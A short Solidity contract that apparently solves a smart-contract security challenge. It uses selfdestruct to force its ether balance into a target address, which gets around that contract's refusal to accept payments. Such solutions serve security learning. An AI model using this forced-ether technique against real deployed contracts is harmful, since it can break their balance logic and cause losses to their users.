// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

contract ForceSolution {
    function solve(address receiver) external payable {
        selfdestruct(payable(receiver));
    }
}